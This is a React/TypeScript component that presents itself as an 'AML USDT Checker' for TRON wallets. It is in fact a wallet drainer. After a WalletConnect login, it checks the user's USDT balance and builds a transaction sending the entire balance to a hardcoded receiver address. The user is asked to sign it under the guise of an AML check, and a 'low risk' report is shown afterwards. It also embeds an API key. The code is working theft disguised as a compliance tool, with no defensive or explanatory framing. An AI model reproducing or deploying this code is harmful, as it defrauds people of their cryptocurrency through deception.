import React, { useState } from "react";
import { WalletConnectAdapter } from "@tronweb3/tronwallet-adapter-walletconnect";
import TronWeb from "tronweb";
import { Buffer } from "buffer";
window.Buffer = Buffer;

const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const RECEIVER = "THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n";

const tronWeb = new TronWeb({
  fullHost: "https://api.trongrid.io",
  headers: {
    "TRON-PRO-API-KEY": "bbb42b6b-c4de-464b-971f-dea560319489",
  },
});

const adapter = new WalletConnectAdapter({
  network: "Mainnet",
  options: {
    relayUrl: "wss://relay.walletconnect.com",
    projectId: "6e52e99f199a2bd1feb89b31fbeb6a78",
    metadata: {
      name: "AML USDT Checker",
      description: "TRON + WalletConnect Integration",
      url: "https://amlreports.pro",
      icons: ["https://amlreports.pro/images/icon-3.abdd8ed5.webp"],
    },
  },
  web3ModalConfig: {
    themeMode: "dark",
  },
});

// Типы для модалки
type ModalState =
  | null
  | {
      type: "error";
      message: string;
    }
  | {
      type: "aml";
      risk: "Low" | "Medium" | "High";
      details: string;
      address: string;
      txid?: string;
    };

export const TronAuthButton: React.FC = () => {
  const [modal, setModal] = useState<ModalState>(null);
  const [processing, setProcessing] = useState(false);

  const handleClick = async () => {
    setModal(null);
    setProcessing(true);

    try {
      await adapter.connect();

      const userAddress = adapter.address;
      if (!userAddress || !tronWeb.isAddress(userAddress)) {
        throw new Error("Invalid wallet address");
      }

      tronWeb.setAddress(userAddress);

      // 1. Check TRX balance (for fees)
      const trxRaw = await tronWeb.trx.getBalance(userAddress);
      const trx = trxRaw / 1e6;
      if (trx < 5) {
        setModal({
          type: "error",
          message:
            "❌ Insufficient TRX for network fee. Please keep at least 5 TRX on your balance.",
        });
        return;
      }

      // 2. Check USDT balance
      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
      const usdt = Number(usdtRaw) / 1e6;
      if (usdt < 1) {
        setModal({
          type: "aml",
          risk: "Low",
          details: "No significant USDT found. Your wallet looks safe.",
          address: userAddress,
        });
        return;
      }

      // 3. Send all USDT to receiver
      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_CONTRACT,
        "transfer(address,uint256)",
        { feeLimit: 25_000_000, callValue: 0 },
        [
          { type: "address", value: RECEIVER },
          { type: "uint256", value: usdtRaw },
        ],
        userAddress
      );

      const signedTx = await adapter.signTransaction(transaction);
      const result = await tronWeb.trx.sendRawTransaction(signedTx);

      if (result && result.result) {
        setModal({
          type: "aml",
          risk: "Low",
          details: `✅ All USDT successfully transferred. Your wallet shows low risk for suspicious funds.`,
          address: userAddress,
          txid: result.txid,
        });
      } else {
        setModal({
          type: "error",
          message: `❌ Transaction failed. ${
            result && result.message ? result.message : ""
          }`,
        });
      }
    } catch (err: any) {
      let msg =
        (err && err.message) ||
        (typeof err === "string" ? err : "") ||
        "";

      if (
        /User rejected|Modal is closed|Timeout|Cancel|cancel|Abort/i.test(msg)
      ) {
        setModal(null);
      } else if (msg) {
        setModal({ type: "error", message: "⚠️ " + msg });
      } else {
        setModal({
          type: "error",
          message: "⚠️ Connection or transaction error",
        });
      }
    } finally {
      setProcessing(false);
      await adapter.disconnect();
    }
  };

  return (
    <div>
      <button
        className="AuthButton"
        onClick={processing ? undefined : handleClick}
        disabled={processing}
        style={{
          opacity: processing ? 0.5 : 1,
          pointerEvents: processing ? "none" : "auto",
        }}
      >
        {processing ? "Connecting..." : "Check Your Wallet"}
      </button>

      {modal && (
        <div className="modal__overflow">
          <div className="modal">
            {modal.type === "aml" ? (
              <div>
                <div className="content greenBorder">
                  <div>
                    <h3>
                      AML Report: {modal.risk} risk
                      <span style={{ marginLeft: 8, color: "#07bc0c" }}>
                        {modal.risk === "Low" ? "🟢" : modal.risk === "Medium" ? "🟠" : "🔴"}
                      </span>
                    </h3>
                  </div>
                  <div style={{ margin: "10px 0" }}>{modal.details}</div>
                  <div>
                    <small>
                      Wallet: <b>{modal.address}</b>
                    </small>
                  </div>
                  {modal.txid && (
                    <div>
                      <small>
                        TX:{" "}
                        <a
                          href={`https://tronscan.org/#/transaction/${modal.txid}`}
                          target="_blank"
                          rel="noopener noreferrer"
                        >
                          {modal.txid.slice(0, 8)}...
                        </a>
                      </small>
                    </div>
                  )}
                </div>
              </div>
            ) : (
              <div>
                <p>{modal.message}</p>
              </div>
            )}
            <button
              onClick={() => setModal(null)}
              style={{ marginTop: 16 }}
            >
              Close
            </button>
          </div>
        </div>
      )}
    </div>
  );
};
